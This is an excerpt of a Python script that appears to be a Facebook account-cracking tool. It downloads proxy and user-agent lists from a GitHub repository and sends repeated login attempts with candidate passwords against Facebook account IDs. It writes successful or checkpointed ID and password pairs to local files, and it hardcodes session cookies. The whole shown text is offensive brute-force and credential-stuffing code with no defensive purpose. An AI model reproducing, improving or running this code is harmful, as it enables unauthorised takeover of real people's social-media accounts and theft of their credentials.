...
import requests
cookies = {
    'datr': 'M-TEZA0M4nsEOlNCoBep3ZyG',
    'sb': 'M-TEZJBADOycpBjQ4LBd-3xC',
    'dnonce': 'AWlOA_dkRG_jUuWYJ9Il9wR5E2f3Q_usbvuRO5Xk4EFYrt1Oc2euX_p4N1rJAR7Zh1085qcWvX3sygz4Eml-kY3y',
    'fr': '0qY6xgm2BBeDdIU8s..BkxOQz.Nl.AAA.0.0.BkxOVx.AWVRm8T0_2E',
}
...
headers = {
    ...
    # 'cookie': 'datr=M-TEZA0M4nsEOlNCoBep3ZyG; sb=M-TEZJBADOycpBjQ4LBd-3xC; dnonce=AWlOA_dkRG_jUuWYJ9Il9wR5E2f3Q_usbvuRO5Xk4EFYrt1Oc2euX_p4N1rJAR7Zh1085qcWvX3sygz4Eml-kY3y; fr=0qY6xgm2BBeDdIU8s..BkxOQz.Nl.AAA.0.0.BkxOVx.AWVRm8T0_2E',
...
response = requests.post(
    'https://free.facebook.com/login/device-based/validate-pin/',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
...
try:
	prox= requests.get('https://github.com/Mrbx709/Mrcrackr/blob/main/Mrbx-Ip.txt').text
	open('.Mrbx-Ip.txt','w').write(prox)
except Exception as e:
	print('')
prox=open('.Mrbx-Ip.txt','r').read().splitlines()
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/Mrbx709/Mrcrackr/blob/main/MRBX-MOBILE.txt').text
		ua=open('.MRBX-MOBILE.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.MRBX-MOBILE.txt','r').read().splitlines()
...
def menu():
	...
	print(f'\x1b[1;98m1- CRACK WITH FILE')
	_____DYNO_____ = input('\x1b[1;96mSELECT :\x1b[1;97m ')
...
def Settings():
	print('')
	print('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92m1. CLONE FB RANDOM \33[m[\x1b[1;92mVery Recomended\33[m] ')
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r CRACK {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\n\x1b[1;93m FACEBOOK: \x1b[1;97m{tahun(idf)}{P} \n\x1b[1;93m USERNAME: \x1b[1;97m{idf}\n\x1b[1;93m PASSWORD: \x1b[1;97m{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif twf in ses.cookies.get_dict().keys():
				print(f'\x1b[1;93m FACEBOOK: \x1b[1;97m{tahun(idf)}{P} \n\x1b[1;93m USERNAME: \x1b[1;97m{idf}\n\x1b[1;93m PASSWORD: \x1b[1;97m{pw}')
				break
				...
				print(f'\x1b[1;92m FACEBOOK ✓: \x1b[1;97m{tahun(idf)} \n\x1b[1;92m USERNAME ✓: \x1b[1;97m{idf}\n\x1b[1;92m PASSWORD ✓: \x1b[1;97m{pw}')
